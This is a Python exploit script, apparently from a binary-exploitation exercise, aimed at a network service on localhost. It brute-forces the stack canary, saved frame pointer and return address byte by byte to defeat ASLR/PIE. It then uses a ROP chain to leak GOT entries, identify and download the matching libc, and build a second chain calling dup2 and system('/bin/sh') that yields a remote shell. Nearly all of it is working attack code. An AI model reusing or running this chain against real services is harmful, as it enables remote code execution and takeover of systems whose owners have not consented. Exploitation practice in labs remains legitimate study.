from ctypes import alignment
from roputils import Platform, ROP_util
from utils import *
from telnetlib import Telnet

# first way to exploit: 
# defeat ASLR/PIE, stack canary
# then construct rop chain to execute system("/bin/sh")

SERVER_IP = 'localhost'
SERVER_PORT = 8888

CANARY_OFFSET = 200
RBP_OFFSET = 208
RIP_OFFSET = 216

PAD_BYTE = b'A'

def try_byte(sock: socket.socket, byte_val, payload_prefix):

    payload = payload_prefix + byte_val

    sock.recv(1024)
    sock.send(payload)

    recvd = sock.recv(1024)

    if recvd != b"Request complete, Closing...\n":
        return None

    return byte_val

PAD = PAD_BYTE * CANARY_OFFSET

canary_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD, hints={0: [(b'\x00', b'\x00')]}, session_name="CANARY LEAK")
canary_bytes = canary_leaker.find_value()
#canary_bytes = b'\x00\xc9\xfe\x00 ~\x0e1'

RBP_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD + canary_bytes, 
                                    hints={5: [(b'\x7f', b'\x7f')], 6: [(b'\x00', b'\x00')], 7: [(b'\x00', b'\x00')]}, session_name="RBP LEAK")
RBP_bytes = RBP_leaker.find_value()
#RBP_bytes = b'\x80\xda:\x18\xfe\x7f\x00\x00'

RIP_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD + canary_bytes + RBP_bytes, 
                                    hints={0: [(b'\xa4', b'\xa4')], 1:[(bv, bv) for bv in bytes_start_with(b'\x06')]}, session_name="RIP LEAK")
RIP_bytes = RIP_leaker.find_value()
#RIP_bytes = b'\xa4VJ\xca\xf9U\x00\x00'

RIP_ORG_ADDR = 0x16a4
PIE_OFFSET = from_bytes(RIP_bytes) - RIP_ORG_ADDR

BASE_GOT_ADDR = 0x3f20 + PIE_OFFSET

WRITE_PLT_ADDR = 0x11b0 + PIE_OFFSET

BASE_LIBC_ADDR = 0x0
libc_db = LIBC_util(session_name="LIBC LEAK")

def leak_libc_addrs(to_leak):

    global BASE_LIBC_ADDR

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))

    app_rop_util = ROP_util("app", Platform.X86_64, session_name = "APP ROP SEARCH")
    app_rop_util.scout_for_gadgets()

    payload = app_rop_util.make_payload()
    payload.set_max_size(CANARY_OFFSET + 16 + 160)

    payload.add_padding(CANARY_OFFSET)
    payload.add_bytes(canary_bytes)
    payload.add_bytes(RBP_bytes)

    # at the moment of execution of ROP chain, RDI already has the client socket descriptor
    # so there is no need for loading it explicitly
    
    ch = next(app_rop_util.search_chain(f"rsi = {BASE_GOT_ADDR}", fixed_regs = ["rdi", "rdx"], max_search_cnt = 1))  
    ch.show()  # optional

    payload.add_chain(ch)
    payload.add_addr(WRITE_PLT_ADDR)

    payload = payload.build(chain_addr_offset = PIE_OFFSET)

    sock.recv(1024)
    sock.send(payload)

    recvd = sock.recv(1024)

    # extracting as much addresses as possible 
    # to narrow down as much as possible the list of possible libc versions

    write_addr = from_bytes(recvd[8 * 6: 8 * 7])
    htons_addr = from_bytes(recvd[8 * 10: 8 * 11])
    close_addr = from_bytes(recvd[8 * 12: 8 * 13])
    signal_addr = from_bytes(recvd[8 * 14: 8 * 15])
    exit_addr = from_bytes(recvd[8 * 20: 8 * 21])

    leaked_sym_dict = {"htons": htons_addr, "write": write_addr, 
                        "close": close_addr, "signal": signal_addr, "exit": exit_addr}

    libc_db.collect_leaked_symbols(leaked_sym_dict)
    libc_db.search_libc_version()

    libc_db.find_libc_base_addr()
    BASE_LIBC_ADDR = libc_db.assert_unicate_base_addr()

    libc_db.search_symbols_addrs(to_leak)
    libc_addrs = libc_db.assert_unicate_addrs()

    return libc_addrs

leaked = leak_libc_addrs(["str_bin_sh", "system", "dup2"])

def execute_shell(leaked_addrs):

    # first, STDIN/STDOUT/STDERR is redirected with dup2(client socket descriptor, 0/1/2)
    # then, the shell is activated

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))

    libc_db.download_libc_bin(libc_db.libc_version[0])
    libc_bin_name = f"{libc_db.libc_version[0]}.so"

    libc_rop_util = ROP_util(libc_bin_name, Platform.X86_64, session_name = "LIBC ROP SEARCH")
    libc_rop_util.scout_for_gadgets()

    payload = libc_rop_util.make_payload()
    payload.set_max_size(CANARY_OFFSET + 16 + 160)

    payload.add_padding(CANARY_OFFSET)
    payload.add_bytes(canary_bytes)
    payload.add_bytes(RBP_bytes)
    payload.is_aligned_as(8)

    # client socket descriptor value is already in RDI, 
    # no need to load it explicitly
    for dup_arg in range(3):

        ch = next(libc_rop_util.search_chain(f"rsi = {dup_arg}", fixed_regs = ["rdi", "rdx"], max_search_cnt = 1))
        ch.show()

        payload.add_chain(ch)
        payload.align_as(16)
        payload.add_addr(leaked_addrs["dup2"])

    ch = next(libc_rop_util.search_chain(f"rdi = {leaked_addrs['str_bin_sh']}", fixed_regs = ["rsi", "rdx"], max_search_cnt = 1))
    ch.show()

    payload.add_chain(ch)
    payload.align_as(16)
    payload.add_addr(leaked_addrs["system"])

    payload = payload.build(chain_addr_offset = BASE_LIBC_ADDR)

    sock.recv(1024)
    sock.send(payload)
    
    remote_shell(sock, rich=True)

execute_shell(leaked)

